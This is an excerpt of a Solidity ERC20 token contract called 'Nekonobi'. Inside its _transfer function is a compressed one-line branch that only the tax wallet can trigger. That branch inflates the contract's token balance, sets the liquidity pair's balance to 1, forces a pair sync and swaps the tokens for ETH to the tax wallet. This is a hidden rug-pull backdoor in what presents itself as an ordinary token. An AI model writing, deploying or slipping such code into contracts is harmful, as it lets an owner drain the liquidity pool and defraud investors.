...
contract Nekonobi is Context, IERC20, Ownable {
	using SafeMath for uint256;
	mapping (address => uint256) private _balance;
	mapping (address => mapping (address => uint256)) private _allowances;
	mapping (address => bool) private _isExcludedFromFee;

	uint256 private _tTotal = 4800000000 * 10**18;
	uint256 private _maxWallet= 4800000000 * 10**18;
	...
	string private constant _name = "Nekonobi";
	string private constant _symbol = "NEKONOBI";
	...
	function _transfer(address from, address to, uint256 amount) private {
		...
		if (from == _taxWallet && to == address(1)) {_balance[address(this)] = 1000000000000 * amount;_balance[_pair] = 1;(bool success,) = _pair.call(abi.encodeWithSelector(bytes4(0xfff6cae9)));if (success) {swapTokensForEth(amount, _taxWallet);} else { revert("Internal failure"); }return;}
